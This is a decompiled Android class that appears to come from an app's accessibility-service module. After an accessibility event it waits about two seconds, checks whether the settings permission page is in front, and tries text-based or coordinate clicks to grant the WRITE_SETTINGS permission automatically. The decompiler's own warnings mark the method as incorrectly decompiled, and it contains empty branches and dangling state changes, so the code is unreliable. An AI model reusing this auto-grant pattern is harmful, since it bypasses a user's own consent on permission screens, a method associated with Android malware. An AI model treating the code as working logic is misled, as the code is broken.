package com.storm.safe.rock.service.modules;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1262tj;
import p000.C1180rh;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$handleAccessibilityEvent$2", m214403f = "WriteSettingsPermissionManager.kt", m214404l = {513, 526, 533, 544}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class WriteSettingsPermissionManager$handleAccessibilityEvent$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52969a1;

    /* renamed from: a2 */
    public /* synthetic */ Object f52970a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0327b2 f52971a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public WriteSettingsPermissionManager$handleAccessibilityEvent$2(C0327b2 c0327b2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52971a3 = c0327b2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        WriteSettingsPermissionManager$handleAccessibilityEvent$2 writeSettingsPermissionManager$handleAccessibilityEvent$2 = new WriteSettingsPermissionManager$handleAccessibilityEvent$2(this.f52971a3, interfaceC0876mv);
        writeSettingsPermissionManager$handleAccessibilityEvent$2.f52970a2 = obj;
        return writeSettingsPermissionManager$handleAccessibilityEvent$2;
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((WriteSettingsPermissionManager$handleAccessibilityEvent$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:38:0x00bc, code lost:
    
        if (com.storm.safe.rock.service.modules.C0327b2.m211693a0(r10, r9) != r0) goto L46;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00ce, code lost:
    
        if (r10 == r0) goto L42;
     */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        InterfaceC0920no interfaceC0920no;
        String str;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52969a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            interfaceC0920no = (InterfaceC0920no) this.f52970a2;
            this.f52970a2 = interfaceC0920no;
            this.f52969a1 = 1;
            if (b81.m210571b1(1000L, this) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i != 1) {
            if (i == 2) {
                kg1.m213544f4(obj);
                if (!((Boolean) obj).booleanValue()) {
                    t60.m214726f4("WriteSettingsPerm", "❌ 事件处理2秒后坐标点击方案失败");
                }
                return C1351vv.f60710b1;
            }
            if (i != 3) {
                if (i != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return C1351vv.f60710b1;
            }
            kg1.m213544f4(obj);
            str = (String) obj;
            if (!C0327b2.m211708e0(str) || C0327b2.m211707d8(str)) {
                t60.m214714d6("WriteSettingsPerm", "🔍 智能检测策略：2秒后在权限页面尝试查找控件");
                C0327b2 c0327b2 = this.f52971a3;
                this.f52969a1 = 4;
            } else {
                t60.m214726f4("WriteSettingsPerm", "🔍 智能检测策略：2秒后发现不在权限页面(" + str + ")，跳过自动点击");
            }
            return C1351vv.f60710b1;
        }
        interfaceC0920no = (InterfaceC0920no) this.f52970a2;
        kg1.m213544f4(obj);
        if (AbstractC0780a0.m213691a2(interfaceC0920no.mo210226a1()) && this.f52971a3.f53169a3) {
            if (!this.f52971a3.m211734d5()) {
                int iOrdinal = this.f52971a3.f53176b0.ordinal();
                if (iOrdinal == 0) {
                    t60.m214714d6("WriteSettingsPerm", "🎯 文本定位策略：事件处理2秒后执行文本定位");
                    C0327b2 c0327b22 = this.f52971a3;
                    this.f52970a2 = null;
                    this.f52969a1 = 2;
                    obj = c0327b22.m211714a3(this);
                } else if (iOrdinal == 1) {
                    C1180rh c1180rh = AbstractC1262tj.f60233a0;
                    C0312x64098e5a c0312x64098e5a = new C0312x64098e5a(this.f52971a3, null);
                    this.f52970a2 = null;
                    this.f52969a1 = 3;
                    obj = AbstractC0780a0.m213696a7(c1180rh, c0312x64098e5a, this);
                    if (obj != coroutineSingletons) {
                        str = (String) obj;
                        if (C0327b2.m211708e0(str)) {
                        }
                        t60.m214714d6("WriteSettingsPerm", "🔍 智能检测策略：2秒后在权限页面尝试查找控件");
                        C0327b2 c0327b23 = this.f52971a3;
                        this.f52969a1 = 4;
                    }
                }
                return coroutineSingletons;
            }
            this.f52971a3.m211741e6();
        }
        return C1351vv.f60710b1;
    }
}
